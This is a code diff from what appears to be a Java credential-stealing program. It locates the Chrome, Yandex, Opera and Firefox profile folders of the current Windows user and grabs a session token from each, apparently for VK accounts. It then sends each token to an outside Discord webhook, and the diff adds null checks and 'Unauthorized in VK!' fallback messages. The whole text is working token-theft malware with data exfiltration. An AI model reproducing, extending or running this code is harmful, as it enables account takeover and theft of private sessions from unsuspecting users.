@@ -21,6 +21,7 @@ public class Main {
 		String yandex = "C:\\Users\\" + username + "\\AppData\\Local\\Yandex\\YandexBrowser";
 		String opera = "C:\\Users\\" + username + "\\AppData\\Roaming\\Opera Software";
 		String firefox = "C:\\Users\\" + username + "\\AppData\\Roaming\\Mozilla\\Firefox";
+		String token = "";
 		try {
 			DiscordHook.sendMessage(prefix, "[" + new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime().getTime()) + "] - Searching token on " + username);		
 		   } catch (Exception e) {
@@ -28,8 +29,13 @@ public class Main {
 		if (browser == null || browser.equalsIgnoreCase("chrome")) {
 			if (new File(chrome).exists()) {
 				try {
-					DiscordHook.sendMessage(prefix + "[Chrome]", Chrome.grabToken());
-					return;
+					token = Chrome.grabToken();
+					if (token != null) {
+						DiscordHook.sendMessage(prefix + "[Chrome]", Chrome.grabToken());
+						return;
+					 } else {
+						 DiscordHook.sendMessage(prefix + "[Chrome]", "Unauthorized in VK!");
+					 }
 				   } catch (Exception e) {
 				}
 			}
@@ -37,27 +43,42 @@ public class Main {
 		if (browser == null || browser.equalsIgnoreCase("yandex")) {
 			if (new File(yandex).exists()) {
 				try {
-					DiscordHook.sendMessage(prefix + "[Yandex]", Yandex.grabToken());
-					return;
-				} catch (Exception e) {
+					token = Yandex.grabToken();
+					if (token != null) {
+						DiscordHook.sendMessage(prefix + "[Yandex]", token);
+						return;
+					  } else {
+						  DiscordHook.sendMessage(prefix + "[Yandex]", "Unauthorized in VK!");
+					  }
+				    } catch (Exception e) {
 				 }
 		    }
 		}
 		if (browser == null || browser.equalsIgnoreCase("opera")) {
 			if (new File(opera).exists()) {
 				try {
-					DiscordHook.sendMessage(prefix + "[Opera]", Opera.grabToken());
-					return;
-				} catch (Exception e) {
+					token = Opera.grabToken();
+					if (token != null) {
+						DiscordHook.sendMessage(prefix + "[Opera]", token);
+						return;
+					  } else {
+						  DiscordHook.sendMessage(prefix + "[Opera]", "Unauthorized in VK!");
+					  }
+				   } catch (Exception e) {
 				}
 			 }
 		 }
 		if (browser == null || browser.equalsIgnoreCase("firefox")) {
 			if (new File(firefox).exists()) {
 				try {
-					DiscordHook.sendMessage(prefix + "[Firefox]", Firefox.grabToken());
-					return;
-				} catch (Exception e) {
+					token = Firefox.grabToken();
+					if (token != null) {
+						DiscordHook.sendMessage(prefix + "[Firefox]", token);
+						return;
+					} else {
+						DiscordHook.sendMessage(prefix + "[Firefox]", "Unauthorized in VK!");
+					}
+				  } catch (Exception e) {
 				}
 			 }
 		 }
